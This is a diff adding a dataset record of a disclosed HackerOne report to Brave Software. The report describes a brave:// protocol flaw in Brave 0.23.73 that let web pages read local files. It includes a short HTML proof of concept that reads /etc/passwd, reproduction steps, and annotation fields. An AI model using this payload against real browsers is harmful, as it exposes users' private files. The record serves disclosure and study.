@@ -1,0 +1,38 @@
+{
+    "reported_to": "Brave Software",
+    "reported_by": "metnew ",
+    "title": "Local files reading from the web using `brave://`",
+    "content": "\nSummary:\nbrave:// protocol was introduced as a replacement for AsarProtocolHandler(or something like that) in brave/muon after #375329.\nHowever, fix for #375329 introduced a new much severe bug that allows reading files from a user's device from the web.\nPoC is similar to #375329, but it uses brave:// instead of file://:\nCode 261 Bytes\n1<head>\n2    <script>\n3        function show() {\n4            var file = link.import.querySelector('body')\n5            alert(file.innerHTML)\n6        }\n7    </script>\n8    <link id=\"link\" href=\"brave:///etc/passwd\" rel=\"import\" as=\"document\" onload=\"show()\" />\n9</head>\nProducts affected:\nBrave: 0.23.73\nV8: 6.8.275.24\nrev: 50bdb6df42550dd14f5636770ec8585aa26e361b\nMuon: 8.0.3\nOS Release: 17.7.0\nUpdate Channel: Release\nOS Architecture: x64\nOS Platform: macOS\nNode.js: 7.9.0\nBrave Sync: v1.4.2\nlibchromiumcontent: 68.0.3440.75\nSteps To Reproduce:\nOpen exploit.html from the web\nPage alerts contents of file:///etc/passwd\nSupporting Material\nScreencast attached.\nImpact\nReading local files from the web is a critical vulnerability.\nI'm investigating this issue more detailed now, maybe impact is much severe than reading local files.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1537848300,
+    "report_url": "https://hackerone.com/reports/390013",
+    "is_multi_component": false,
+    "complexity": "MEDIUM",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create an HTML file with a script that attempts to load a local file using the `brave://` protocol, similar to the provided PoC code."
+        ],
+        [
+            2,
+            "Open the HTML file in a web browser (Brave version 0.23.73 or affected versions) to observe the contents of the local file (e.g., /etc/passwd) being displayed."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows reading local files from a user's device through the web by exploiting the `brave://` protocol in Brave browser. This is a critical security flaw as it bypasses normal file access restrictions, potentially exposing sensitive system files to malicious websites.",
+    "reason": "The attack involves a straightforward exploitation of a protocol handler replacement (`brave://` for `file://`) without requiring complex interactions or state manipulations. The discovery mainly relies on understanding the protocol handler's behavior and testing its boundaries, which is relatively direct once the initial concept is considered.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "#375329"
+}
